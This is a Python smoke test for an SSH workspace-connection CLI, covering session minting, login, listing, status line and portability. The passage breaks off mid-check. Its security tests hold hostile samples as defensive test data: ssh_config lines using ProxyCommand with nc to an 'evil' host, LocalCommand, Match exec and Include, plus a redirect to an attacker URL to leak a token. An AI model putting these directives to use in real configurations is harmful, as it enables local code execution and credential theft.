"""Offline smoke test for the runcode engine.

Mocks the backend with the REAL bundle shape, runs a real `connect` (real
ssh-keygen + real file materialization), then proves the generated ssh config is
correct via `ssh -G` (the authoritative check that the appended local-only lines
land inside the server's Host block). No network, no Django.

Run:  python3 tests/test_engine.py
Requires: python3, ssh-keygen, ssh (OpenSSH client).
"""
import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import threading
import time
import types
import urllib.parse
import urllib.request
from datetime import datetime, timedelta, timezone
from importlib.machinery import SourceFileLoader

HOME = tempfile.mkdtemp(prefix="rcssh-home-")
os.environ["HOME"] = HOME
os.environ["XDG_CACHE_HOME"] = os.path.join(HOME, ".cache")
os.environ["XDG_CONFIG_HOME"] = os.path.join(HOME, ".config")
os.environ["RUNCODE_TOKEN"] = "dummy-token"

ENGINE = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin", "runcode"
)
loader = SourceFileLoader("runcode_ssh", ENGINE)
spec = importlib.util.spec_from_loader("runcode_ssh", loader)
m = importlib.util.module_from_spec(spec)
loader.exec_module(m)

# Pristine refs to engine functions that later tests monkeypatch away, so the
# dir-scoping tests at the end can drive the REAL implementations.
_REAL_set_current = m._set_current
_REAL_get_current = m._get_current

GATEWAY_HK = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMMX4zU1L+LUX0ar89JKBPqFopXJGw14rjsZV3z4/e4U"
USER = "royal-tree-08189931"
ALIAS = "runcode-" + USER
calls = {"post": 0}


def fake_api(method, path, token, base, body=None):
    if method == "POST" and path.endswith("/ssh-session"):
        calls["post"] += 1
        assert token == "dummy-token"
        assert body and body.get("public_key", "").startswith("ssh-ed25519 ")
        assert body.get("client") == "claude-code"
        exp = (datetime.now(timezone.utc) + timedelta(seconds=1800)).isoformat()
        return {
            "error": False,
            "bundle": {
                "host": "ssh.ws.runcode.io",
                "port": 2222,
                "user": USER,
                "known_hosts": "[ssh.ws.runcode.io]:2222 " + GATEWAY_HK,
                "credential": {"type": "key", "certificate": None},
                "web_url": "https://%s.ws.runcode.io" % USER,
                "expires_at": exp,
                "ssh_config": (
                    "Host %s\n  HostName ssh.ws.runcode.io\n  Port 2222\n"
                    "  User %s\n  IdentitiesOnly yes\n  StrictHostKeyChecking yes\n"
                    % (ALIAS, USER)
                ),
            },
        }
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = fake_api
real_resolve = m._resolve_workspace  # capture before stubbing (tested at the end)
m._resolve_workspace = lambda ident, token, base: (1234, USER)


def args(**kw):
    base = dict(workspace="my-ws", api_base="https://app.runcode.io", token=None,
                force=False, ttl=1800, json=True, command=None)
    base.update(kw)
    return types.SimpleNamespace(**base)


def connect(**kw):
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        m.cmd_connect(args(**kw))
    finally:
        sys.stdout = old
    return json.loads(buf.getvalue())


# 1. mint
out = connect()
assert out["alias"] == ALIAS and out["reused"] is False and calls["post"] == 1
cfg = out["config"]
d = os.path.dirname(cfg)
assert os.path.isfile(os.path.join(d, "id_ed25519")) and os.path.isfile(os.path.join(d, "id_ed25519.pub"))
assert oct(os.stat(os.path.join(d, "id_ed25519")).st_mode)[-3:] == "600"
assert oct(os.stat(d).st_mode)[-3:] == "700"
print("[1] connect mints session + correct perms: OK")

# 2. ssh -G resolves the effective config
g = subprocess.run(["ssh", "-G", "-F", cfg, ALIAS], capture_output=True, text=True)
assert g.returncode == 0, g.stderr
geff = {}
for line in g.stdout.splitlines():
    k, _, v = line.partition(" ")
    geff.setdefault(k.lower(), v)
checks = {
    "hostname": "ssh.ws.runcode.io", "port": "2222", "user": USER,
    "identitiesonly": "yes", "stricthostkeychecking": "yes", "batchmode": "yes",
    "identityfile": os.path.join(d, "id_ed25519"),
    "userknownhostsfile": os.path.join(d, "known_hosts"),
}
for k, want in checks.items():
    got = geff.get(k, "")
    if k in ("identityfile", "userknownhostsfile"):
        assert os.path.basename(want) in got, "%s = %r" % (k, got)
    elif want == "yes":
        assert got in ("yes", "true"), "%s = %r" % (k, got)  # -G canonicalizes some
    else:
        assert got == want, "%s = %r (want %r)" % (k, got, want)
print("[2] ssh -G resolves host/port/user/identity/known_hosts/strict/batch: OK")

# 3. pinned known_hosts
with open(os.path.join(d, "known_hosts")) as fh:
    assert fh.read().strip() == "[ssh.ws.runcode.io]:2222 " + GATEWAY_HK
print("[3] known_hosts pinned (bracketed host:port form): OK")

# 4. reuse
assert connect()["reused"] is True and calls["post"] == 1
print("[4] valid cached session is reused (no re-mint): OK")

# 5. --force
assert connect(force=True)["reused"] is False and calls["post"] == 2
print("[5] --force re-mints: OK")

# 6. expired -> re-mint
mp = os.path.join(d, "meta.json")
meta = json.load(open(mp))
meta["expires_at"] = (datetime.now(timezone.utc) - timedelta(seconds=5)).isoformat()
json.dump(meta, open(mp, "w"))
assert connect()["reused"] is False and calls["post"] == 3
print("[6] expired session re-mints: OK")

# 7. generated pubkey is the single-line form the backend regex accepts
with open(os.path.join(d, "id_ed25519.pub")) as fh:
    pub = fh.read().strip()
assert re.match(r"^(ssh-ed25519|ssh-rsa|ecdsa-[\w-]+|sk-[\w@.-]+) [A-Za-z0-9+/=]+( .+)?$", pub), pub
print("[7] generated pubkey is single-line and well-formed: OK")


# --- login (browser-assisted loopback) ------------------------------------- #
def make_opener(token="LOGINTOKEN123", email="dev@runcode.io", state_override=None):
    """Stand in for the browser: parse the authorize URL and fire the loopback
    callback from another thread (the server loop runs on the main thread)."""
    def opener(url):
        q = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
        port = q["port"][0]
        state = state_override if state_override is not None else q["state"][0]
        cb = "http://127.0.0.1:%s/callback?%s" % (
            port, urllib.parse.urlencode({"state": state, "token": token, "email": email})
        )

        def fire():
            for _ in range(60):
                try:
                    urllib.request.urlopen(cb, timeout=2).read()
                    return
                except Exception:
                    time.sleep(0.05)

        threading.Thread(target=fire, daemon=True).start()
    return opener


# 8. happy path: loopback returns the token + email; _save_token perms
os.environ.pop("RUNCODE_TOKEN", None)  # so _load_token falls through to the file
tp = m._token_path()
if os.path.exists(tp):
    os.remove(tp)
tok, email = m._do_browser_login("https://runcode.io", make_opener(), timeout=10)
assert tok == "LOGINTOKEN123", tok
assert email == "dev@runcode.io", email
saved = m._save_token(tok)
assert open(saved).read().strip() == "LOGINTOKEN123"
assert oct(os.stat(saved).st_mode)[-3:] == "600"
assert oct(os.stat(os.path.dirname(saved)).st_mode)[-3:] == "700"
assert m._load_token(None) == "LOGINTOKEN123"  # round-trips through the file
print("[8] browser login loopback returns + saves token (0600, round-trips): OK")

# 9. a callback with the wrong state is rejected (anti-cross-site)
try:
    m._do_browser_login("https://runcode.io",
                        make_opener(state_override="not-the-real-state"), timeout=10)
    raise AssertionError("expected SystemExit on state mismatch")
except SystemExit:
    pass
print("[9] callback with mismatched state aborts (SystemExit): OK")

# 10. logout removes the saved token
m.cmd_logout(types.SimpleNamespace())
assert not os.path.exists(tp)
print("[10] logout removes the saved token file: OK")


# --- list / fetch / resolve workspaces ------------------------------------- #
# A workspace appears in both pages (owned + shared) to exercise de-dup; the
# list mixes SSH-capable running/stopped boxes and one box SSH can't reach.
# `provider` is the upstream field the capability gate reads ("aws" == reachable);
# any other value is a workspace SSH can't reach.
WS_PAGES = {
    "active": [
        {"id": 42, "title": USER, "custom_title": "",
         "provider": "aws", "interim_state": "running"},
        {"id": 43, "title": "brave-sea-1234", "custom_title": "staging",
         "provider": "aws", "interim_state": "stopped"},
        {"id": 7, "title": "old-legacy-box", "custom_title": "",
         "provider": "legacy", "interim_state": "running"},
    ],
    "shared": [
        {"id": 42, "title": USER, "custom_title": "",
         "provider": "aws", "interim_state": "running"},  # dup of owned
        {"id": 99, "title": "team-box", "custom_title": "",
         "provider": "aws", "interim_state": "running"},
    ],
}


def fake_list_api(method, path, token, base, body=None):
    assert method == "GET" and path.startswith("/workspaces"), path
    cat = urllib.parse.parse_qs(urllib.parse.urlparse(path).query).get("category", [""])[0]
    return {"error": False, "data": {"workspaces": WS_PAGES.get(cat, [])}}


m._api = fake_list_api
os.environ["RUNCODE_TOKEN"] = "dummy-token"  # restore (login tests popped it)

# 11. _fetch_workspaces de-dups by id and normalizes; owned sighting wins
wss = m._fetch_workspaces("dummy-token", "https://app.runcode.io")
by_id = {w["id"]: w for w in wss}
assert set(by_id) == {7, 42, 43, 99}, by_id
assert by_id[42]["state"] == "running" and by_id[42]["provider"] == "aws"
assert by_id[42]["shared"] is False  # owned sighting wins over the shared dup
assert by_id[99]["shared"] is True
assert m._ws_connectable(by_id[42]) and not m._ws_connectable(by_id[43])
assert not m._ws_connectable(by_id[7])  # non-capable provider running is NOT connectable
print("[11] _fetch_workspaces de-dups + flags running + SSH-capable as connectable: OK")


def list_json(**kw):
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        m.cmd_list(types.SimpleNamespace(
            token=None, api_base="https://app.runcode.io",
            json=True, all=kw.get("all", False)))
    finally:
        sys.stdout = old
    return json.loads(buf.getvalue())


# 12. cmd_list --json hides non-connectable boxes by default; --all includes them;
#     connectable flag; and the internal `provider` gate field is NOT leaked to JSON.
shown = list_json()
assert {w["id"] for w in shown} == {42, 43, 99}, "non-capable ws must be hidden by default"
assert next(w for w in shown if w["id"] == 42)["connectable"] is True
assert next(w for w in shown if w["id"] == 43)["connectable"] is False  # stopped
assert all("provider" not in w for w in shown), "provider must not appear in JSON output"
assert {w["id"] for w in list_json(all=True)} == {7, 42, 43, 99}
print("[12] cmd_list --json: SSH-capable default, --all adds the rest, no provider leak: OK")

# 13. _resolve_workspace matches title AND custom (display) title, errors on miss
m._resolve_workspace = real_resolve
assert m._resolve_workspace("brave-sea-1234", "dummy-token", "https://app.runcode.io")[0] == 43
assert m._resolve_workspace("staging", "dummy-token", "https://app.runcode.io")[0] == 43
try:
    m._resolve_workspace("nope", "dummy-token", "https://app.runcode.io")
    raise AssertionError("expected SystemExit for an unknown name")
except SystemExit:
    pass
print("[13] _resolve_workspace matches title + custom_title, errors on miss: OK")

# 14. statusline names the currently-connected workspace by its token-less web host
seg = m._current_session()
assert seg is not None and seg.get("ws_id") == 1234, seg  # connect set the pointer
assert m._web_host(seg) == USER + ".ws.runcode.io", m._web_host(seg)
buf = io.StringIO()
old = sys.stdout
sys.stdout = buf
try:
    m.cmd_statusline(types.SimpleNamespace(plain=True))
finally:
    sys.stdout = old
line = buf.getvalue().strip()
assert line.startswith("working-on:%s.ws.runcode.io ~" % USER), line
print("[14] statusline shows the connected workspace (token-less web host): OK")

# 15. exec runs on the ATTACHED workspace (current pointer) with no name repeated
captured = {}
real_exec = m._exec_ssh
m._exec_ssh = lambda meta, cmd, home=False, remint=None: captured.update(
    meta=meta, cmd=cmd, home=home)
assert m._get_current() == 1234, m._get_current()  # connect attached it
m.cmd_exec(types.SimpleNamespace(token=None, api_base="https://app.runcode.io",
                                 ttl=1800, force=False, home=False, command=["--", "echo", "hi"]))
assert captured["cmd"] == ["echo", "hi"], captured
assert captured["meta"].get("ws_id") == 1234, captured["meta"]
print("[15] exec targets the attached workspace (no name needed): OK")

# 16. disconnect detaches + drops the session; exec then refuses (back to local)
m.cmd_disconnect(types.SimpleNamespace(keep=False))
assert m._get_current() is None
assert not os.path.isdir(m._ws_cache_dir(1234))
try:
    m.cmd_exec(types.SimpleNamespace(token=None, api_base="https://app.runcode.io",
                                     ttl=1800, force=False, command=["--", "x"]))
    raise AssertionError("expected SystemExit when nothing is attached")
except SystemExit:
    pass
m._exec_ssh = real_exec
print("[16] disconnect detaches + drops material; exec then refuses: OK")

# 17. disconnect --keep detaches but KEEPS the material; the status line still
#     goes dark. Regression for the bug where _current_session fell back to "any
#     live session" and so resurrected a just-detached (but still-cached) box —
#     the status line must honor ONLY the `current` pointer, like cmd_current.
m._api = fake_api
m._resolve_workspace = lambda ident, token, base: (1234, USER)
connect()  # re-attach ws 1234: fresh live session + pointer set
assert m._get_current() == 1234
m.cmd_disconnect(types.SimpleNamespace(keep=True))
assert m._get_current() is None, "--keep must still DETACH (clear the pointer)"
assert os.path.isdir(m._ws_cache_dir(1234)), "--keep must retain the cached material"
assert m._current_session() is None, "detached -> no current session, even though live material remains"
buf = io.StringIO()
old = sys.stdout
sys.stdout = buf
try:
    m.cmd_statusline(types.SimpleNamespace(plain=True))
finally:
    sys.stdout = old
assert buf.getvalue().strip() == "", "status line must be dark after disconnect --keep: %r" % buf.getvalue()
print("[17] disconnect --keep detaches yet keeps material; status line goes dark: OK")

# 18. statusline prints NOTHING when no session is live (segment disappears)
import shutil as _sh
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
buf = io.StringIO()
old = sys.stdout
sys.stdout = buf
try:
    m.cmd_statusline(types.SimpleNamespace(plain=True))
finally:
    sys.stdout = old
assert buf.getvalue().strip() == "", repr(buf.getvalue())
print("[18] statusline is silent with no live session: OK")


# --- connect --start / --wait readiness + structured --json errors --------- #
# A deterministic virtual clock so the readiness polls never sleep on real wall
# time (the poll loops call time.time()/time.sleep()).
class _FakeClock:
    def __init__(self):
        self.t = 1000.0

    def time(self):
        return self.t

    def sleep(self, secs):
        self.t += max(0.0, float(secs))


_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
m.time = _FakeClock()


def _bundle():
    exp = (datetime.now(timezone.utc) + timedelta(seconds=1800)).isoformat()
    return {
        "error": False,
        "bundle": {
            "host": "ssh.ws.runcode.io", "port": 2222, "user": USER,
            "known_hosts": "[ssh.ws.runcode.io]:2222 " + GATEWAY_HK,
            "credential": {"type": "key", "certificate": None},
            "web_url": "https://%s.ws.runcode.io" % USER, "expires_at": exp,
            "ssh_config": (
                "Host %s\n  HostName ssh.ws.runcode.io\n  Port 2222\n"
                "  User %s\n  IdentitiesOnly yes\n  StrictHostKeyChecking yes\n"
                % (ALIAS, USER)
            ),
        },
    }


def _ws_page(path, state):
    """Build a one-workspace (id 55) list response for the requested category."""
    cat = urllib.parse.parse_qs(urllib.parse.urlparse(path).query).get("category", [""])[0]
    ws = {"id": 55, "title": USER, "custom_title": "",
          "provider": "aws", "interim_state": state}
    return {"error": False, "data": {"workspaces": [ws] if cat == "active" else []}}


def connect_or_die(**kw):
    """Run cmd_connect capturing stdout; return ('ok'|'die', parsed_json_or_None)."""
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    rc = "ok"
    try:
        try:
            m.cmd_connect(args(**kw))
        except SystemExit:
            rc = "die"
    finally:
        sys.stdout = old
    txt = buf.getvalue().strip()
    return rc, (json.loads(txt) if txt else None)


m._resolve_workspace = lambda ident, token, base: (55, USER)

# 19. --start: a STOPPED box is started (once), then a session is minted on it,
#     and the JSON reports started=True.
calls["post"] = 0
box19 = {"state": "stopped", "started": 0}


def api19(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspaces"):
        return _ws_page(path, box19["state"])
    if method == "GET" and path.startswith("/workspace/start"):
        box19["started"] += 1
        box19["state"] = "running"  # control plane comes up
        return {"error": False, "message": "Workspace started successfully"}
    if method == "POST" and path.endswith("/ssh-session"):
        calls["post"] += 1
        return _bundle()
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api19
rc, out = connect_or_die(workspace="my-ws", start=True, wait=False, timeout=30)
assert rc == "ok", out
assert box19["started"] == 1, "start must be called exactly once for a stopped box"
assert out.get("started") is True, out
assert out["alias"] == ALIAS and calls["post"] == 1
print("[19] connect --start starts a stopped workspace then mints: OK")

# 20. --start fast path: an ALREADY-RUNNING box is NOT started, just minted.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
calls["post"] = 0
box20 = {"started": 0}


def api20(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspaces"):
        return _ws_page(path, "running")
    if method == "GET" and path.startswith("/workspace/start"):
        box20["started"] += 1
        return {"error": False, "message": "Workspace started successfully"}
    if method == "POST" and path.endswith("/ssh-session"):
        calls["post"] += 1
        return _bundle()
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api20
rc, out = connect_or_die(workspace="my-ws", start=True, wait=False, timeout=30)
assert rc == "ok", out
assert box20["started"] == 0, "an already-running box must NOT be started"
assert out.get("started") is False and calls["post"] == 1
print("[20] connect --start is a no-op for an already-running box: OK")

# 21. --start surfaces a backend start failure (e.g. insufficient balance) as a
#     structured JSON error, and does NOT go on to mint.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
calls["post"] = 0


def api21(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspaces"):
        return _ws_page(path, "stopped")
    if method == "GET" and path.startswith("/workspace/start"):
        return {"error": True,
                "message": "Insufficient balance. Please add credits to start this workspace."}
    raise AssertionError("must not reach: %s %s" % (method, path))


m._api = api21
rc, out = connect_or_die(workspace="my-ws", start=True, wait=False, timeout=30)
assert rc == "die", out
assert out and out.get("error") and "Insufficient balance" in out.get("message", ""), out
assert calls["post"] == 0, "a failed start must not proceed to mint"
print("[21] connect --start surfaces a start failure as a structured error: OK")

# 22. --wait probes SSH and returns once the box answers (running box, no start).
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
calls["post"] = 0
probe = {"n": 0}
m._ssh_reachable_once = lambda meta: (probe.__setitem__("n", probe["n"] + 1) or probe["n"] >= 2)


def api22(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspaces"):
        return _ws_page(path, "running")
    if method == "POST" and path.endswith("/ssh-session"):
        calls["post"] += 1
        return _bundle()
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api22
rc, out = connect_or_die(workspace="my-ws", start=False, wait=True, timeout=30)
assert rc == "ok", out
assert probe["n"] >= 2, "must keep probing until SSH is reachable"
assert out["alias"] == ALIAS and calls["post"] == 1
print("[22] connect --wait probes SSH until the workspace answers: OK")

# 23. --wait times out (box never answers) -> structured not_ready error.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)
calls["post"] = 0
m._ssh_reachable_once = lambda meta: False
m._api = api22  # running box, mint succeeds; only the SSH probe fails
rc, out = connect_or_die(workspace="my-ws", start=False, wait=True, timeout=12)
assert rc == "die", out
assert out and out.get("error") == "not_ready", out
print("[23] connect --wait times out with a structured not_ready error: OK")

# 24. A backend refusal during --json connect emits a structured JSON error to
#     stdout (not opaque plain-text on stderr) and exits non-zero.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)


def api24(method, path, token, base, body=None):
    if method == "GET" and path.startswith("/workspaces"):
        return _ws_page(path, "running")
    if method == "POST" and path.endswith("/ssh-session"):
        return {"error": True, "message": "boom"}
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api24
rc, out = connect_or_die(workspace="my-ws", start=False, wait=False)
assert rc == "die", out
assert out and out.get("error") and "boom" in out.get("message", ""), out
print("[24] --json failure emits a structured JSON error to stdout: OK")


# --- install-statusline (auto-wire the status line into settings.json) ----- #
# Point the installer at a throwaway config dir so it never touches the real
# ~/.claude/settings.json (it honors CLAUDE_CONFIG_DIR).
_settings_dir = os.path.join(HOME, "dot-claude")
os.environ["CLAUDE_CONFIG_DIR"] = _settings_dir
_settings_file = os.path.join(_settings_dir, "settings.json")
_sh.rmtree(_settings_dir, ignore_errors=True)


def run_quiet(fn, **ns):
    buf = io.StringIO()
    old = sys.stdout
    sys.stdout = buf
    try:
        fn(types.SimpleNamespace(**ns))
    finally:
        sys.stdout = old
    return buf.getvalue()


# 25. a fresh install writes a command statusLine that invokes this script.
run_quiet(m.cmd_install_statusline, remove=False, force=False)
with open(_settings_file) as fh:
    s25 = json.load(fh)
sl = s25.get("statusLine")
assert sl and sl.get("type") == "command", s25
assert sl["command"].endswith(" statusline") and "runcode" in sl["command"], sl
print("[25] install-statusline writes a command statusLine into settings.json: OK")

# 26. idempotent + preserves the user's other settings (no clobber).
with open(_settings_file, "w") as fh:
    json.dump({"statusLine": sl, "model": "opus"}, fh)
run_quiet(m.cmd_install_statusline, remove=False, force=False)
with open(_settings_file) as fh:
    s26 = json.load(fh)
assert s26.get("model") == "opus", "must preserve unrelated settings: %r" % s26
assert s26["statusLine"]["command"] == sl["command"]
print("[26] install-statusline is idempotent and preserves other settings: OK")

# 27. --remove unwires only our status line, leaving other settings intact.
run_quiet(m.cmd_install_statusline, remove=True, force=False)
with open(_settings_file) as fh:
    s27 = json.load(fh)
assert "statusLine" not in s27 and s27.get("model") == "opus", s27
print("[27] install-statusline --remove unwires only our status line: OK")


# --- security: insecure control plane + hostile ssh_config (defense in depth) #
# Threat: an attacker who can MITM the API base, or who compromises the control
# plane, must NOT be able to (a) sniff the token over cleartext or (b) turn a
# `connect` into LOCAL code execution via a hostile ssh_config. Two guards close
# both — on top of TLS, which the first guard now makes mandatory.

# 28. secure-base guard: https is always allowed; http ONLY for loopback (local
#     dev); any other http, or a non-http scheme, is refused.
for good in ("https://app.runcode.io", "https://x.example",
             "http://127.0.0.1:8000", "http://localhost:9000", "http://[::1]:7000"):
    m._require_secure_base(good)  # must NOT raise
for bad in ("http://evil.example", "http://app.runcode.io", "ftp://x", ""):
    try:
        m._require_secure_base(bad)
        raise AssertionError("expected refusal for %r" % bad)
    except SystemExit:
        pass
print("[28] secure-base guard: https + loopback-http allowed, public http refused: OK")

# 28b. cmd_connect refuses an insecure --api-base BEFORE any network call (the
#      token must never leave over cleartext), reported as a structured error.
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)


def _landmine(*a, **k):
    raise AssertionError("must not touch the network with an insecure base")


_saved_api, _saved_resolve = m._api, m._resolve_workspace
m._api = _landmine
m._resolve_workspace = _landmine
rc, out = connect_or_die(workspace="my-ws", api_base="http://evil.example")
assert rc == "die" and out and out.get("error") == "insecure_base", out
m._api, m._resolve_workspace = _saved_api, _saved_resolve
print("[28b] cmd_connect refuses an insecure api-base before any network call: OK")

# 29. unsafe-ssh_config guard: any directive that can run a LOCAL command is
#     rejected, in either "Key value" or "Key=value" form, case-insensitively;
#     a clean config passes untouched.
m._assert_safe_ssh_config(
    "Host x\n  HostName h\n  Port 22\n  User u\n  IdentitiesOnly yes\n")  # no raise
for evil in (
    "Host x\n  ProxyCommand nc evil 1\n",
    "Host x\n  proxycommand=nc evil 1\n",
    "Host x\n  PermitLocalCommand yes\n  LocalCommand touch /tmp/pwn\n",
    "Host x\n  KnownHostsCommand /bin/evil\n",
    'Host x\n  Match exec "evil" host x\n',
    # C1: Include pulls in another file and parses it AS ssh_config -- e.g. the
    # verbatim-written known_hosts -- so a ProxyCommand can be smuggled past a
    # naive directive scan. Must be rejected outright.
    "Host x\n  Include ~/.cache/runcode/ws-1/known_hosts\n",
    "Host x\n  include=/etc/passwd\n",
):
    try:
        m._assert_safe_ssh_config(evil)
        raise AssertionError("expected refusal for %r" % evil)
    except SystemExit:
        pass
print("[29] unsafe-ssh_config guard rejects local-command directives: OK")

# 29b. a bundle whose ssh_config smuggles ProxyCommand is refused at mint time,
#      structured, and NOTHING is written to disk (no config -> ssh never runs).
_sh.rmtree(m.CACHE_ROOT, ignore_errors=True)


def api29(method, path, token, base, body=None):
    if method == "POST" and path.endswith("/ssh-session"):
        b = _bundle()
        b["bundle"]["ssh_config"] += "  ProxyCommand nc evil.example 1\n"
        return b
    raise AssertionError("unexpected API call: %s %s" % (method, path))


m._api = api29
m._resolve_workspace = lambda ident, token, base: (55, USER)
rc, out = connect_or_die(workspace="my-ws", start=False, wait=False)
assert rc == "die" and out and out.get("error") == "unsafe_bundle", out
assert not os.path.isfile(os.path.join(m._ws_cache_dir(55), "config")), \
    "a hostile bundle must never be written to disk"
print("[29b] a hostile ssh_config is refused at mint; nothing written to disk: OK")


# --- portability: Windows / macOS / Linux ---------------------------------- #
# The engine must run on all three. These exercise the platform-specific seams
# without an actual Windows host, by flipping the module's _IS_WINDOWS gate.

# 30. base dirs: an explicit XDG_* override wins on every platform (what the
#     tests + power users rely on); else Windows uses APPDATA/LOCALAPPDATA and
#     POSIX uses ~/.config / ~/.cache.
_env_keys = ("XDG_CONFIG_HOME", "XDG_CACHE_HOME", "APPDATA", "LOCALAPPDATA")
_saved_env = {k: os.environ.get(k) for k in _env_keys}
_saved_iswin = m._IS_WINDOWS
try:
    os.environ["XDG_CONFIG_HOME"] = "/xdg/cfg"
    os.environ["XDG_CACHE_HOME"] = "/xdg/cache"
    m._IS_WINDOWS = True
    assert m._config_home() == "/xdg/cfg" and m._cache_home() == "/xdg/cache", \
        "explicit XDG override must win even on Windows"
    os.environ.pop("XDG_CONFIG_HOME")
    os.environ.pop("XDG_CACHE_HOME")
    os.environ["APPDATA"] = r"C:\Users\dev\AppData\Roaming"
    os.environ["LOCALAPPDATA"] = r"C:\Users\dev\AppData\Local"
    assert m._config_home() == r"C:\Users\dev\AppData\Roaming", m._config_home()
    assert m._cache_home() == r"C:\Users\dev\AppData\Local", m._cache_home()
    m._IS_WINDOWS = False
    os.environ.pop("APPDATA")
    os.environ.pop("LOCALAPPDATA")
    assert m._config_home() == os.path.expanduser("~/.config"), m._config_home()
    assert m._cache_home() == os.path.expanduser("~/.cache"), m._cache_home()
finally:
    m._IS_WINDOWS = _saved_iswin
    for k, v in _saved_env.items():
        if v is None:
            os.environ.pop(k, None)
        else:
            os.environ[k] = v
print("[30] base dirs: XDG wins; Windows APPDATA/LOCALAPPDATA, POSIX ~/.config: OK")

# 31. _exec_ssh on Windows must NOT os.execvp (it mangles the console there): it
#     runs ssh via subprocess and propagates the child's exit code.
_saved_iswin = m._IS_WINDOWS
_saved_call = m.subprocess.call
_cap31 = {}


def _fake_call(argv, *a, **k):
    _cap31["argv"] = argv
    return 7


try:
    m._IS_WINDOWS = True
    m.subprocess.call = _fake_call
    try:
        m._exec_ssh({"config": "/tmp/cfg", "alias": "runcode-x"}, ["echo", "hi"])
        raise AssertionError("expected SystemExit propagating ssh's exit code")
    except SystemExit as e:
        assert e.code == 7, e.code
    a31 = _cap31["argv"]
    assert a31[0] == "ssh" or a31[0].endswith("ssh") or a31[0].endswith("ssh.exe"), a31
    assert "-F" in a31 and "/tmp/cfg" in a31 and "runcode-x" in a31, a31
    assert a31[-2:] == ["echo", "hi"], a31
finally:
    m._IS_WINDOWS = _saved_iswin
    m.subprocess.call = _saved_call
print("[31] _exec_ssh on Windows runs ssh via subprocess + propagates exit code: OK")

# 32. ssh/ssh-keygen are resolved via PATH, falling back to the bare name when
#     which() finds nothing (so the FileNotFoundError handlers still give the
#     clean "install the OpenSSH client" message).
_saved_which = m.shutil.which
try:
    m.shutil.which = lambda *_: None
    assert m._ssh_exe() == "ssh" and m._sshkeygen_exe() == "ssh-keygen"
    m.shutil.which = lambda name, *a, **k: "/opt/openssh/" + name
    assert m._ssh_exe() == "/opt/openssh/ssh", m._ssh_exe()
finally:
    m.shutil.which = _saved_which
print("[32] ssh/ssh-keygen resolved via PATH with a bare-name fallback: OK")

# 33. _self_command (the status-line invocation written into settings.json) must
#     target the .cmd shim on Windows (the extensionless script isn't runnable as
#     a status-line command there); on POSIX it stays the bare script path.
_saved_iswin = m._IS_WINDOWS
try:
    m._IS_WINDOWS = False
    assert m._self_command().endswith("runcode statusline"), m._self_command()
    m._IS_WINDOWS = True
    win_cmd = m._self_command()
    assert win_cmd.endswith("statusline"), win_cmd
    assert "runcode.cmd" in win_cmd, win_cmd
finally:
    m._IS_WINDOWS = _saved_iswin
print("[33] _self_command targets the .cmd shim on Windows, bare script on POSIX: OK")

# 34. materialized ssh config QUOTES the local IdentityFile / UserKnownHostsFile
#     so a path with spaces (common on Windows: C:\Users\First Last\...) survives
#     ssh_config parsing, and GlobalKnownHostsFile points at the OS null device
#     (NUL on Windows, not the literal /dev/null). (test [2] proves the quoted
#     form stays valid for `ssh -G`.)
_spacedir = os.path.join(HOME, "dir with space", "ws")
os.makedirs(_spacedir, mode=0o700, exist_ok=True)
_kp = os.path.join(_spacedir, "id_ed25519")
open(_kp, "w").close()
_alias34, _cfg34 = m._materialize(_spacedir, _bundle()["bundle"], _kp)
with open(_cfg34) as fh:
    _cfgtxt = fh.read()
assert ('IdentityFile "%s"' % _kp) in _cfgtxt, _cfgtxt
assert ('UserKnownHostsFile "%s"' % os.path.join(_spacedir, "known_hosts")) in _cfgtxt, _cfgtxt
assert ("GlobalKnownHostsFile %s" % os.devnull) in _cfgtxt, _cfgtxt
print("[34] materialized config quotes spaced paths + OS-null GlobalKnownHostsFile: OK")

# 35. redirect downgrade guard: urllib follows redirects AND carries the
#     Authorization header, so a compromised/MITM'd https endpoint must not be
#     able to 30x us to http://attacker and exfiltrate the token. The secure
#     opener re-applies the https-only gate to every redirect target.
_h35 = m._SecureRedirectHandler()
_req35 = urllib.request.Request(
    "https://app.runcode.io/api/rc/x", headers={"Authorization": "Token secret"})
_ok = _h35.redirect_request(_req35, io.BytesIO(b""), 302, "Found", {},
                            "https://app.runcode.io/api/rc/y")
assert _ok is not None, "an https->https redirect must be allowed"
try:
    _h35.redirect_request(_req35, io.BytesIO(b""), 302, "Found", {},
                          "http://evil.example/steal")
    raise AssertionError("expected refusal on an https->http redirect")
except SystemExit:
    pass
print("[35] redirect guard refuses an https->http (token-exfil) downgrade: OK")


# --- doctor: first-run-on-a-new-OS preflight -------------------------------- #
def _by_name(results):
    return {r["name"]: r for r in results}


# 36. _doctor_checks: all good -> ok True, every check 'ok' (ssh present, token
#     present via RUNCODE_TOKEN, https base, auth verifies).
_saved_which = m.shutil.which
_saved_verify = m._verify_token
try:
    m.shutil.which = lambda name, *a, **k: "/usr/bin/" + name
    m._verify_token = lambda tok, base: True
    res36, ok36 = m._doctor_checks(types.SimpleNamespace(
        token=None, api_base="https://app.runcode.io", json=False))
    by36 = _by_name(res36)
    assert ok36 is True, res36
    for name in ("python", "ssh", "ssh-keygen", "token", "api-base", "auth"):
